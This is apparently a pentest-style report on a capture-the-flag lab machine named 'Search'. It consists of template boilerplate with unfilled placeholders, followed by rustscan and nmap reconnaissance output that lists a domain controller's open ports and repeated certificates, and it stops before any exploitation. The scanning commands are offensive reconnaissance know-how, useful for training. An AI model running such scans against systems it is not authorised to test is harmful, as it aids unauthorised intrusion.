# Search

## Penetration Test Report

### Introduction

The penetration test report contains all efforts that were conducted during client engagement. The purpose of this report is to ensure that the client has a full understanding of penetration testing methodologies as well as the technical knowlegde to remediate any security flaws.

### Objective

The objective of this assessment is to perform an internal penetration test against the network. The student is tasked with following methodical approach in obtaining full control of the network. This test should simulate an attacker and how an attacker would start from beginning to end.

### Requirements

The pentester will be required to fill out this penetration testing report fully and to include the following sections:

* Overall High-Level Summary and Recommendations (non-technical)
* Methodology walkthrough and detailed outline of steps taken
* Each finding with included screenshots, walkthrough, sample code, and root.txt if applicable
* Any additional items that were not included

## High-Level Summary

I was tasked with performing an internal penetration test towards the client network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate internal systems. My overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to the client.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on client's network. When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations. During the testing, I had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below:

* 10.129.227.156 (hostname) - Name of initial exploit

### Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

## Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the environments is secured. Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

### Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, I was tasked with exploiting the client network. The specific IP addresses were:

**Network**

* 10.129.227.0/24

### Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, I was able to successfully gain access to _X_ out of the _X_ systems.

#### System IP: 10.129.227.156

**Service Enumeration**

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

| Server IP Address | Ports Open                                                                                          |
| ----------------- | --------------------------------------------------------------------------------------------------- |
| 10.129.227.156    | **TCP**: 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49667,49693,49694,49704,49719 |
|                   | **UDP**:                                                                                            |

**Nmap Scan Results**

```
┌──[Thu Nov 10 07:03:19 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.227.156]
└──# rscan $ip        
rustscan --accessible -u 5000 -b 2500 -a 10.129.227.156 -- -Pn -A

Automatically increasing ulimit value to 5000.
Open 10.129.227.156:53
Open 10.129.227.156:80
Open 10.129.227.156:88
Open 10.129.227.156:135
Open 10.129.227.156:139
Open 10.129.227.156:389
Open 10.129.227.156:443
Open 10.129.227.156:445
Open 10.129.227.156:464
Open 10.129.227.156:593
Open 10.129.227.156:636
Open 10.129.227.156:3268
Open 10.129.227.156:3269
Open 10.129.227.156:8172
Open 10.129.227.156:9389
Open 10.129.227.156:49667
Open 10.129.227.156:49693
Open 10.129.227.156:49694
Open 10.129.227.156:49704
Open 10.129.227.156:49719
Starting Script(s)
Running script "nmap -vvv -p {{port}} {{ip}} -Pn -A" on ip 10.129.227.156
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 19:04 CST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:04
Completed NSE at 19:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:04
Completed NSE at 19:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:04
Completed NSE at 19:04, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:04
Completed Parallel DNS resolution of 1 host. at 19:04, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:04
Scanning 10.129.227.156 [20 ports]
Discovered open port 443/tcp on 10.129.227.156
Discovered open port 135/tcp on 10.129.227.156
Discovered open port 80/tcp on 10.129.227.156
Discovered open port 53/tcp on 10.129.227.156
Discovered open port 139/tcp on 10.129.227.156
Discovered open port 8172/tcp on 10.129.227.156
Discovered open port 445/tcp on 10.129.227.156
Discovered open port 636/tcp on 10.129.227.156
Discovered open port 88/tcp on 10.129.227.156
Discovered open port 389/tcp on 10.129.227.156
Discovered open port 593/tcp on 10.129.227.156
Discovered open port 49667/tcp on 10.129.227.156
Discovered open port 49719/tcp on 10.129.227.156
Discovered open port 3269/tcp on 10.129.227.156
Discovered open port 464/tcp on 10.129.227.156
Discovered open port 49704/tcp on 10.129.227.156
Discovered open port 49693/tcp on 10.129.227.156
Discovered open port 3268/tcp on 10.129.227.156
Discovered open port 9389/tcp on 10.129.227.156
Discovered open port 49694/tcp on 10.129.227.156
Completed SYN Stealth Scan at 19:04, 0.51s elapsed (20 total ports)
Initiating Service scan at 19:04
Scanning 20 services on 10.129.227.156
Completed Service scan at 19:05, 56.41s elapsed (20 services on 1 host)
Initiating OS detection (try #1) against 10.129.227.156
Retrying OS detection (try #2) against 10.129.227.156
Initiating Traceroute at 19:05
Completed Traceroute at 19:05, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 19:05
Completed Parallel DNS resolution of 2 hosts. at 19:05, 0.00s elapsed
DNS resolution of 2 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.129.227.156.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:05
NSE Timing: About 99.96% done; ETC: 19:05 (0:00:00 remaining)
Completed NSE at 19:05, 40.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 2.62s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Nmap scan report for 10.129.227.156
Host is up, received user-set (0.15s latency).
Scanned at 2022-11-10 19:04:10 CST for 105s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Search &mdash; Just Testing IIS
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-11-11 01:04:17Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-11-11T01:05:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
|_ssl-date: 2022-11-11T01:05:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-11-11T01:05:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-11-11T01:05:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-11-11T01:05:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738 614f 7bc0 29d0 6d1d 9ea6 3cdb d99e
| SHA-1: 10ae 5494 29d6 1e44 276f b8a2 24ca fde9 de93 af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
8172/tcp  open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-11-11T01:05:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Issuer: commonName=WMSvc-SHA2-RESEARCH
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-07T09:05:25
